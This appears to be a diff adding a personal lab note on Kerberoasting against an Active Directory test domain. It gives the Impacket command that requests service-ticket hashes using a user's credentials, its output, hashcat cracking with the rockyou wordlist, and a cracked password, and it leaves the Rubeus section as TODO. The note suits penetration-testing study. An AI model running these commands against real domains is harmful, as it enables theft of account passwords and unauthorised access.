@@ -1,0 +1,28 @@
+# Kerberoasting
+## Impacket Method
+`-save` will save a ccache file, but we want the hashes to crack, so we use `-outputfile`
+```
+impacket-GetUserSPNs -outputfile kerberoast_hashes.txt -dc-ip 10.0.1.10 'attacklab.local/Phoebe Chillax:summer2021!'
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName           Name           MemberOf  PasswordLastSet             LastLogon  Delegation
+-----------------------------  -------------  --------  --------------------------  ---------  ----------
+Kerberoast Me/attacklab.local  Kerberoast Me            2021-08-31 23:34:02.562550  <never>
+```
+Hashcat is supposed to support compressed wordlists, but it did not work for me
+```
+cd /usr/share/wordlists/
+gzip -d rockyou.txt.gz
+```
+Crack the hashes
+```
+hashcat -m 13100 -o cracked_hash.txt kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+It will output the full hash and the password appended, but it is also stored in the file we defined
+```
+cat cracked_hash.txt
+[SNIP]:P@ssw0rd!
+```
+## Rubeus Method
+
+TODO
